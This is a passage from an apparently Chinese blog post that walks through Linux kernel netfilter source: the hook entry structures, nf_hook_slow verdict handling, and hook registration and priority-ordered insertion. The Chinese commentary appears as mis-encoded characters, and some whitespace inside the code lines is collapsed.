class="hljs-title">nf_hook_entries</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">hooks_ipv6</span>[<span class="hljs-title">NF_INET_NUMHOOKS</span>];</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER_FAMILY_ARP</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">hooks_arp</span>[<span class="hljs-title">NF_ARP_NUMHOOKS</span>];</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER_FAMILY_BRIDGE</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">hooks_bridge</span>[<span class="hljs-title">NF_INET_NUMHOOKS</span>];</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> IS_ENABLED(CONFIG_DECNET)</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">hooks_decnet</span>[<span class="hljs-title">NF_DN_NUMHOOKS</span>];</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> &#123;</span><br>u16num_hook_entries;<br><span class="hljs-comment">/* padding */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entry</span><span class="hljs-title">hooks</span>[];</span><br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entry</span> &#123;</span><br>nf_hookfn*hook;<br><span class="hljs-type">void</span>*priv;<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nf_hookfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *priv,</span><br><span class="hljs-params">       <span class="hljs-keyword">struct</span> sk_buff *skb,</span><br><span class="hljs-params">       <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_state *state)</span>;<br></code></pre></td></tr></table></figure><p>ç»“æ„ç›®å‰çœ‹æ¥å¤§æ¦‚æ˜¯è¿™æ ·ğŸ‘‡</p><img src="/2024/02/08/nft%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/nf_hook.png" class title="nf_hook"><ul><li>nf_hook_entriesè¡¨ç¤ºNF_INET_PRE_ROUTINGç­‰5ç§hookç‚¹</li><li>nf_hook_entryè¡¨ç¤ºä¸€ä¸ªhookç‚¹ä¸Šçš„ä¸€ä¸ªhookå‡½æ•°</li></ul></li><li><p>nf_hook_state_initåˆå§‹åŒ–äº†ä¸­é—´ç»“æ„ä½“nf_hook_state</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">nf_hook_state_init</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> nf_hook_state *p,</span><br><span class="hljs-params">      <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hook,</span><br><span class="hljs-params">      <span class="hljs-type">u_int8_t</span> pf,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> net_device *indev,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> net_device *outdev,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> sock *sk,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> net *net,</span><br><span class="hljs-params">      <span class="hljs-type">int</span> (*okfn)(<span class="hljs-keyword">struct</span> net *, <span class="hljs-keyword">struct</span> sock *, <span class="hljs-keyword">struct</span> sk_buff *))</span><br>&#123;<br>p-&gt;hook = hook;<br>p-&gt;pf = pf;<br>p-&gt;in = indev;<br>p-&gt;out = outdev;<br>p-&gt;sk = sk;<br>p-&gt;net = net;<br>p-&gt;okfn = okfn;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_state</span> &#123;</span><br>u8 hook;<br>u8 pf;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device</span> *<span class="hljs-title">in</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device</span> *<span class="hljs-title">out</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock</span> *<span class="hljs-title">sk</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net</span> *<span class="hljs-title">net</span>;</span><br><span class="hljs-type">int</span> (*okfn)(<span class="hljs-keyword">struct</span> net *, <span class="hljs-keyword">struct</span> sock *, <span class="hljs-keyword">struct</span> sk_buff *);<br>&#125;;<br></code></pre></td></tr></table></figure><p>nf_hook_slowçœŸæ­£æ‰§è¡Œäº†æ‰€æœ‰çš„hookï¼Œå¹¶æ ¹æ®hookçš„è¿”å›å€¼å†³å®šä¸‹ä¸€æ­¥åŠ¨ä½œï¼Œä¸¢å¼ƒæŠ¥æ–‡ &#x2F; æ¥å—æŠ¥æ–‡ &#x2F; åŠ å…¥é˜Ÿåˆ—ç”±å¯¹åº”æ¨¡å—å¤„ç†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Returns 1 if okfn() needs to be executed by the caller,</span><br><span class="hljs-comment"> * -EPERM for NF_DROP, 0 otherwise.  Caller must hold rcu_read_lock. */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">nf_hook_slow</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sk_buff *skb, <span class="hljs-keyword">struct</span> nf_hook_state *state,</span><br><span class="hljs-params"> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_entries *e, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> s)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> verdict;<br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-keyword">for</span> (; s &lt; e-&gt;num_hook_entries; s++) &#123;<br>verdict = nf_hook_entry_hookfn(&amp;e-&gt;hooks[s], skb, state);<br><span class="hljs-keyword">switch</span> (verdict &amp; NF_VERDICT_MASK) &#123;<br><span class="hljs-keyword">case</span> NF_ACCEPT:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NF_DROP:<br>kfree_skb(skb);<br>ret = NF_DROP_GETERR(verdict);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">0</span>)<br>ret = -EPERM;<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-keyword">case</span> NF_QUEUE:<br>ret = nf_queue(skb, state, s, verdict);<br><span class="hljs-keyword">if</span> (ret == <span class="hljs-number">1</span>)<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">return</span> ret;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">/* Implicit handling for NF_STOLEN, as well as any other</span><br><span class="hljs-comment"> * non conventional verdicts.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>EXPORT_SYMBOL(nf_hook_slow);<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span><br><span class="hljs-title function_">nf_hook_entry_hookfn</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_entry *entry, <span class="hljs-keyword">struct</span> sk_buff *skb,</span><br><span class="hljs-params">     <span class="hljs-keyword">struct</span> nf_hook_state *state)</span><br>&#123;<br><span class="hljs-keyword">return</span> entry-&gt;hook(entry-&gt;priv, skb, state);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="hookæ³¨å†Œï¼šnf-register-net-hook"><a href="#hookæ³¨å†Œï¼šnf-register-net-hook" class="headerlink" title="hookæ³¨å†Œï¼šnf_register_net_hook"></a>hookæ³¨å†Œï¼šnf_register_net_hook</h2><p>æ ¹æ®åè®®æ³¨å†Œä¸åŒçš„hook</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">nf_register_net_hook</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_ops *reg)</span><br>&#123;<br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (reg-&gt;pf == NFPROTO_INET) &#123;<br><span class="hljs-keyword">if</span> (reg-&gt;hooknum == NF_INET_INGRESS) &#123;<br>err = __nf_register_net_hook(net, NFPROTO_INET, reg);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = __nf_register_net_hook(net, NFPROTO_IPV4, reg);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>err = __nf_register_net_hook(net, NFPROTO_IPV6, reg);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>) &#123;<br>__nf_unregister_net_hook(net, NFPROTO_IPV4, reg);<br><span class="hljs-keyword">return</span> err;<br>&#125;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>err = __nf_register_net_hook(net, reg-&gt;pf, reg);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL(nf_register_net_hook);<br></code></pre></td></tr></table></figure><p>nf_hook_opsç»“æ„ä½“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> &#123;</span><br><span class="hljs-comment">/* User fills in from here down. */</span><br>nf_hookfn*hook;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">net_device</span>*<span class="hljs-title">dev</span>;</span><br><span class="hljs-type">void</span>*priv;<br>u8pf;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nf_hook_ops_type</span><span class="hljs-title">hook_ops_type</span>:</span><span class="hljs-number">8</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>hooknum;<br><span class="hljs-comment">/* Hooks are ordered in ascending priority. */</span><br><span class="hljs-type">int</span>priority;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p>hookï¼šhookå‡½æ•°</p></li><li><p>devï¼šnetè®¾å¤‡</p></li><li><p>privï¼šæŒ‡é’ˆ</p></li><li><p>pfï¼šåè®®ç±»å‹ï¼ŒPF_INETä¹‹ç±»çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Supported address families. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AF_UNSPEC0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AF_UNIX1<span class="hljs-comment">/* Unix domain sockets */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AF_LOCAL1<span class="hljs-comment">/* POSIX name for AF_UNIX*/</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> AF_INET2<span class="hljs-comment">/* Internet IP Protocol */</span></span><br><br><br><span class="hljs-comment">/* Protocol families, same as address families. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_UNSPECAF_UNSPEC</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_UNIXAF_UNIX</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_LOCALAF_LOCAL</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PF_INETAF_INET</span><br><br><br></code></pre></td></tr></table></figure></li><li><p>hook_ops_typeï¼šæ³¨å†Œçš„hookç±»å‹ï¼Œæ˜¯ä¸æ˜¯nf_tables</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nf_hook_ops_type</span> &#123;</span><br>NF_HOOK_OP_UNDEFINED,<br>NF_HOOK_OP_NF_TABLES,<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>hooknumï¼šhookç±»å‹ï¼ˆæ˜¯å“ªä¸ªhookç‚¹ï¼‰ï¼Œä¹Ÿæ˜¯nf_hook_entriesçš„index</p></li><li><p>priorityï¼šä¼˜å…ˆçº§</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nf_ip_hook_priorities</span> &#123;</span><br>NF_IP_PRI_FIRST = INT_MIN,<br>NF_IP_PRI_RAW_BEFORE_DEFRAG = <span class="hljs-number">-450</span>,<br>NF_IP_PRI_CONNTRACK_DEFRAG = <span class="hljs-number">-400</span>,<br>NF_IP_PRI_RAW = <span class="hljs-number">-300</span>,<br>NF_IP_PRI_SELINUX_FIRST = <span class="hljs-number">-225</span>,<br>NF_IP_PRI_CONNTRACK = <span class="hljs-number">-200</span>,<br>NF_IP_PRI_MANGLE = <span class="hljs-number">-150</span>,<br>NF_IP_PRI_NAT_DST = <span class="hljs-number">-100</span>,<br>NF_IP_PRI_FILTER = <span class="hljs-number">0</span>,<br>NF_IP_PRI_SECURITY = <span class="hljs-number">50</span>,<br>NF_IP_PRI_NAT_SRC = <span class="hljs-number">100</span>,<br>NF_IP_PRI_SELINUX_LAST = <span class="hljs-number">225</span>,<br>NF_IP_PRI_CONNTRACK_HELPER = <span class="hljs-number">300</span>,<br>NF_IP_PRI_CONNTRACK_CONFIRM = INT_MAX,<br>NF_IP_PRI_LAST = INT_MAX,<br>&#125;;<br></code></pre></td></tr></table></figure></li></ul><p>__nf_register_net_hookå°†æ–°çš„hookæ’å…¥å¯¹åº”çš„nf_hook_entriesè¡¨é¡¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> __nf_register_net_hook(<span class="hljs-keyword">struct</span> net *net, <span class="hljs-type">int</span> pf,<br>  <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_ops *reg)<br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> *<span class="hljs-title">p</span>, *<span class="hljs-title">new_hooks</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> __<span class="hljs-title">rcu</span> **<span class="hljs-title">pp</span>;</span><br><span class="hljs-type">int</span> err;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. ç±»å‹æ£€æŸ¥</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">switch</span> (pf) &#123;<br><span class="hljs-keyword">case</span> NFPROTO_NETDEV:<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_NETFILTER_INGRESS</span><br><span class="hljs-keyword">if</span> (reg-&gt;hooknum == NF_NETDEV_INGRESS)<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_NETFILTER_EGRESS</span><br><span class="hljs-keyword">if</span> (reg-&gt;hooknum == NF_NETDEV_EGRESS)<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-keyword">if</span> ((reg-&gt;hooknum != NF_NETDEV_INGRESS &amp;&amp;<br>     reg-&gt;hooknum != NF_NETDEV_EGRESS) ||<br>    !reg-&gt;dev || dev_net(reg-&gt;dev) != net)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFPROTO_INET:<br><span class="hljs-keyword">if</span> (reg-&gt;hooknum != NF_INET_INGRESS)<br><span class="hljs-keyword">break</span>;<br><br>err = nf_ingress_check(net, reg, NF_INET_INGRESS);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. å–å‡ºpfå¯¹åº”åè®®çš„hooknumå¯¹åº”hookç‚¹çš„nf_hook_entriesé¡¹</span><br><span class="hljs-comment">     */</span><br>pp = nf_hook_entry_head(net, pf, reg-&gt;hooknum, reg-&gt;dev);<br><span class="hljs-keyword">if</span> (!pp)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>mutex_lock(&amp;nf_hook_mutex);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. æ›´æ–°nf_hook_entriesï¼Œæ’å…¥æ–°çš„hook</span><br><span class="hljs-comment">     */</span><br>p = nf_entry_dereference(*pp);<br>new_hooks = nf_hook_entries_grow(p, reg);<br><br><span class="hljs-keyword">if</span> (!IS_ERR(new_hooks)) &#123;<br>hooks_validate(new_hooks);<br>rcu_assign_pointer(*pp, new_hooks);<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 4. ä¸€äº›æ£€æŸ¥</span><br><span class="hljs-comment">     */</span><br>mutex_unlock(&amp;nf_hook_mutex);<br><span class="hljs-keyword">if</span> (IS_ERR(new_hooks))<br><span class="hljs-keyword">return</span> PTR_ERR(new_hooks);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER_INGRESS</span><br><span class="hljs-keyword">if</span> (nf_ingress_hook(reg, pf))<br>net_inc_ingress_queue();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NETFILTER_EGRESS</span><br><span class="hljs-keyword">if</span> (nf_egress_hook(reg, pf))<br>net_inc_egress_queue();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>nf_static_key_inc(reg, pf);<br><br>BUG_ON(p == new_hooks);<br>nf_hook_entries_free(p);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹çœ‹nf_hook_entriesæ›´æ–°çš„è¿‡ç¨‹ï¼Œå°±æ˜¯nf_hook_entries_growå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> nf_hook_entries *<br><span class="hljs-title function_">nf_hook_entries_grow</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_entries *old,</span><br><span class="hljs-params">     <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nf_hook_ops *reg)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i, alloc_entries, nhooks, old_entries;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> **<span class="hljs-title">orig_ops</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_ops</span> **<span class="hljs-title">new_ops</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nf_hook_entries</span> *<span class="hljs-title">new</span>;</span><br><span class="hljs-type">bool</span> inserted = <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. è·å–åŸæ¥çš„nf_hook_entriesä¸­æœ‰æ•ˆçš„nf_hook_opsæ•°é‡</span><br><span class="hljs-comment">     */</span><br>alloc_entries = <span class="hljs-number">1</span>;<br>old_entries = old ? old-&gt;num_hook_entries : <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (old) &#123;<br>orig_ops = nf_hook_entries_get_hook_ops(old);<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; old_entries; i++) &#123;<br><span class="hljs-keyword">if</span> (orig_ops[i] != &amp;dummy_ops)<br>alloc_entries++;<br>&#125;<br>&#125;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. ä¸ºæ–°çš„nf_hook_entriesåˆ†é…ç©ºé—´</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (alloc_entries &gt; MAX_HOOK_COUNT)<br><span class="hljs-keyword">return</span> ERR_PTR(-E2BIG);<br><br>new = allocate_hook_entries_size(alloc_entries);<br><span class="hljs-keyword">if</span> (!new)<br><span class="hljs-keyword">return</span> ERR_PTR(-ENOMEM);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. å°†åŸæ¥nf_hook_entriesä¸­æœ‰æ•ˆçš„nf_hook_opså’Œnf_hook_entryé¡¹å¤åˆ¶è¿‡æ¥</span><br><span class="hljs-comment">     *    æ ¹æ®priorityæ’å…¥æ–°çš„hooké¡¹</span><br><span class="hljs-comment">     */</span><br>new_ops = nf_hook_entries_get_hook_ops(new);<br><br>i = <span class="hljs-number">0</span>;<br>nhooks = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (i &lt; old_entries) &#123;<br><span class="hljs-keyword">if</span> (orig_ops[i] == &amp;dummy_ops) &#123;<br>++i;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (inserted || reg-&gt;priority &gt; orig_ops[i]-&gt;priority) &#123;<br>new_ops[nhooks] = (<span class="hljs-type">void</span> *)orig_ops[i];<br>new-&gt;hooks[nhooks] = old-&gt;hooks[i];<br>i++;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>new_ops[nhooks] = (<span class="hljs-type">void</span> 